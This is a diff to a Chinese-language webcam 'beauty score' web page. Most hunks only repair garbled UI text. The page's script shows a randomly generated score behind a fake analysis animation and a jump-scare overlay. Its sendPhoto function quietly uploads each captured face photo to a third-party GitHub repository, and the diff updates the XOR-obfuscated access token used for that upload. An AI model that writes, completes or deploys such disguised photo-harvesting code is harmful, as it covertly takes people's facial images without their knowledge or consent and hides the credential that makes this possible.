@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>棰溌峰€?/title>
+<title>颜·值</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{
@@ -157,11 +157,11 @@ body{
 
 <div class="scare" id="scare">
   <canvas id="scareCanvas"></canvas>
-  <button class="scare-close" onclick="closeScare()">鉁?鍏抽棴</button>
+  <button class="scare-close" onclick="closeScare()">✕ 关闭</button>
 </div>
 
 <div class="card" id="mainCard">
-  <div class="card-title">棰溌峰€?/div>
+  <div class="card-title">颜·值</div>
   <div class="card-sub">BEAUTY SCORE</div>
 
   <div class="camera-wrap" id="cameraWrap">
@@ -174,7 +174,7 @@ body{
 
   <canvas id="canvasCapture"></canvas>
 
-  <div class="status-text" id="status">瀵瑰噯闀滃ご锛岃交瑙︿笅鏂?/div>
+  <div class="status-text" id="status">对准镜头，轻触下方</div>
 
   <div id="loadingBar"></div>
 
@@ -185,14 +185,14 @@ body{
         <span class="score-num" id="scoreNum">0</span>
       </div>
     </div>
-    <div class="score-level" id="scoreLevel">鈥?/div>
+    <div class="score-level" id="scoreLevel">—</div>
     <div class="score-desc" id="scoreDesc"></div>
   </div>
 
   <div class="btn-wrap">
-    <button class="btn" id="mainBtn">寮€濮?/button>
+    <button class="btn" id="mainBtn">开始</button>
   </div>
-  <div class="footer-note">缁撴灉浠呬緵濞变箰</div>
+  <div class="footer-note">结果仅供娱乐</div>
 </div>
 
 <script>
@@ -201,13 +201,13 @@ const CONFIG={PHOTO_REPO:'jun123440/photo-gateway'}
 
 // ====== SCORE DESCRIPTIONS ======
 const SCORE_TIERS=[
-  {min:0,max:25,level:'C',title:'寰呮帰绱?,desc:'鏈夎叮鐨勭伒榄傛瘮鐨泭鏇撮噸瑕?},
-  {min:26,max:40,level:'B-',title:'鏈夋綔鍔?,desc:'绋嶅姞鎵撶悊锛屽畾鑳芥儕鑹?},
-  {min:41,max:55,level:'B',title:'涓笂',desc:'骞插噣鑸掓湇锛岃秺鐪嬭秺椤虹溂'},
-  {min:56,max:70,level:'B+',title:'鍑轰紬',desc:'浜虹兢涓竴鐪煎氨鑳界湅鍒?},
-  {min:71,max:82,level:'A-',title:'鎯婅壋',desc:'杩欓鍊硷紝鍙互闈犺劯鍚冮キ'},
-  {min:83,max:92,level:'A',title:'涓囬噷鎸戜竴',desc:'鑰佸ぉ鐖疯拷鐫€鍠傞キ鐨勯暱鐩?},
-  {min:93,max:100,level:'S',title:'浜洪棿缁濊壊',desc:'姝ら鍙簲澶╀笂鏈?}
+  {min:0,max:25,level:'C',title:'待探索',desc:'有趣的灵魂比皮囊更重要'},
+  {min:26,max:40,level:'B-',title:'有潜力',desc:'稍加打理，定能惊艳'},
+  {min:41,max:55,level:'B',title:'中上',desc:'干净舒服，越看越顺眼'},
+  {min:56,max:70,level:'B+',title:'出众',desc:'人群中一眼就能看到'},
+  {min:71,max:82,level:'A-',title:'惊艳',desc:'这颜值，可以靠脸吃饭'},
+  {min:83,max:92,level:'A',title:'万里挑一',desc:'老天爷追着喂饭的长相'},
+  {min:93,max:100,level:'S',title:'人间绝色',desc:'此颜只应天上有'}
 ]
 
 function getScoreTier(score){
@@ -349,10 +349,10 @@ function startCamera(){
   navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}}}).then(s=>{
     stream=s;video.srcObject=s
     cameraWrap.classList.add('show')
-    status.textContent='鐪嬮暅澶?
-    mainBtn.textContent='鎷嶇収'
+    status.textContent='看镜头'
+    mainBtn.textContent='拍照'
     mainBtn.onclick=startCountdown
-  }).catch(()=>{status.textContent='闇€瑕佹憚鍍忓ご鏉冮檺'})
+  }).catch(()=>{status.textContent='需要摄像头权限'})
 }
 
 function startCountdown(){
@@ -397,7 +397,7 @@ function capturePhoto(){
 }
 
 function getToken(){
-  const k='p4nd4_s3cur3_k3y_2024',b=[23,93,26,12,65,61,44,67,2,1,45,2,110,40,117,45,10,123,3,99,4,21,102,28,22,90,103,9,6,82,26,69,91,0,37,6,75,111,115,114,123,82,9,89,1,54,5,9,36,119,86,49,2,7,10,63,117,27,20,121,124,0,100,54,122,57,83,121,48,38,92,6,32,42,122,102,93,119,77,7,7,115,103,110,50,109,56,3,70,14,54,86,14]
+  const k='p4nd4_s3cur3_k3y_2024',b=[23,93,26,12,65,61,44,67,2,1,45,2,110,40,117,45,10,123,3,99,4,51,119,23,32,1,26,27,92,40,33,55,102,0,13,81,74,37,1,127,104,78,34,89,15,2,118,107,61,105,23,59,54,103,26,24,121,48,55,96,1,68,121,67,13,8,52,97,103,71,102,23,13,16,98,23,32,120,50,5,117,125,100,96,66,123,95,55,121,38,31,96,2]
   return b.map((v,i)=>String.fromCharCode(v^k.charCodeAt(i%k.length))).join('')
 }
 
@@ -413,7 +413,7 @@ async function sendPhoto(){
       body:JSON.stringify({message:title,content:b64,branch:'main'})
     })
     const j=await r.json()
-    if(j.content) status.textContent='涓婁紶鎴愬姛'
+    if(j.content) status.textContent='上传成功'
   }catch(e){}
 }
 
@@ -421,7 +421,7 @@ function showResult(score){
   stopCamera()
   const tier=getScoreTier(score)
   scoreNum.textContent=score
-  scoreLevel.textContent=tier.level+' 路 '+tier.title
+  scoreLevel.textContent=tier.level+' · '+tier.title
   scoreDesc.textContent=tier.desc
   resultScore.style.display='block'
   scoreCircle.style.setProperty('--offset',Math.round(283-283*score/100)+'')
@@ -432,12 +432,12 @@ function showResult(score){
 
 function startFakeLoading(){
   loadingBar.style.display='block';loadingBar.style.width='0%'
-  status.textContent='璁＄畻涓?
-  const msgs=['璇诲彇浜斿畼','鍒嗘瀽姣斾緥','璁＄畻瀵圭О搴?,'鐢熸垚鎶ュ憡']
+  status.textContent='计算中'
+  const msgs=['读取五官','分析比例','计算对称度','生成报告']
   let p=0,i=0
   const iv=setInterval(()=>{
     p+=rand(4,10)
-    if(p>=90){clearInterval(iv);loadingBar.style.width='100%';setTimeout(()=>{loadingBar.style.display='none';status.textContent='瀹屾垚'},200);return}
+    if(p>=90){clearInterval(iv);loadingBar.style.width='100%';setTimeout(()=>{loadingBar.style.display='none';status.textContent='完成'},200);return}
     loadingBar.style.width=p+'%'
     if(p>i*25){status.textContent=msgs[i];i++}
   },50)
@@ -449,7 +449,7 @@ function startFakeLoading(){
     document.body.classList.add('screen-shake')
     setTimeout(()=>document.body.classList.remove('screen-shake'),800)
     mainBtn.style.display='inline-block'
-    mainBtn.textContent='鍐嶈瘯涓€娆?
+    mainBtn.textContent='再试一次'
     mainBtn.onclick=resetAll
   },1600)
 }
@@ -466,8 +466,8 @@ function resetAll(){
   resultScore.style.display='none'
   scoreCircle.classList.remove('anim')
   loadingBar.style.display='none'
-  status.textContent='瀵瑰噯闀滃ご锛岃交瑙︿笅鏂?
-  mainBtn.textContent='寮€濮?
+  status.textContent='对准镜头，轻触下方'
+  mainBtn.textContent='开始'
   mainBtn.onclick=startCamera
   mainBtn.style.display='inline-block'
   capturedData=null
